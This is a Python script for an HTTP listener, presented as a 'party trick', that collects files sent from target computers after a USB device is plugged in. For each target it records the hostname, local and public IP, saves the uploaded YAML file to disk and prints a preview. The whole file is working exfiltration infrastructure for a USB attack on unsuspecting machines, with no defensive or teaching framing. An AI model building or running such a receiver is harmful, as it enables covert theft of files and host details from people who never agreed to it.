from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import unquote, urlparse, parse_qs
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.table import Table

# Initialize the Rich console for formatting
console = Console()


class PartyTrickHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Parse hostname from path (Format: /Hostname)
        parsed = urlparse(self.path)
        sender_host = unquote(parsed.path).strip("/") or "Unknown"
        
        # Read custom message and public IP headers
        msg = self.headers.get('X-Message', 'No message')
        public_ip = self.headers.get('X-Public-IP', 'Unknown')

        # Read the uploaded file content from the POST body
        content_length_str = self.headers.get('Content-Length')
        content_length = int(content_length_str) if content_length_str else 0
        file_content: str = self.rfile.read(content_length).decode('utf-8', errors='replace')

        # Save the file to disk
        filename = f"plugins_{sender_host}.yaml"
        if file_content != 'Not found':
            with open(filename, "w", encoding="utf-8") as f:
                f.write(file_content)
            status_text = f"[bold green]Saved to {filename}[/bold green]"
            preview = file_content[:200] + ("..." if len(file_content) > 200 else "")
        else:
            status_text = "[bold red]File not found on target[/bold red]"
            preview = ""

        # Extract local/relay IP
        local_ip = self.client_address[0]

        # Build a rich display
        content = Table.grid(padding=(0, 2))
        content.add_column(justify="left", style="bold cyan")
        content.add_column(justify="left")
        
        content.add_row("Host:", sender_host)
        content.add_row("Local IP:", local_ip)
        content.add_row("Public IP:", public_ip)
        content.add_row("Message:", msg)
        content.add_row("Status:", Text.from_markup(status_text))
        
        if preview:
            content.add_row("Preview:", Text(preview, style="dim white"))

        panel = Panel(
            content,
            title="[bold yellow]File Received[/bold yellow]",
            expand=False,
            padding=(1, 5),
        )

        console.print(panel)

        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"File received")

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Receiver is running. Waiting for POST requests.")

    def log_message(self, format, *args):
        pass


def run_server(port=8080):
    server_address = ("", port)
    httpd = HTTPServer(server_address, PartyTrickHandler)

    console.print("[bold yellow]Ready for the party trick![/bold yellow]")
    console.print(
        f"[dim]Listening on port {port}. Plug in the USB device now...[/dim]\n"
    )

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        console.print("\n[bold red]Shutting down receiver...[/bold red]")
        httpd.server_close()


if __name__ == "__main__":
    run_server()
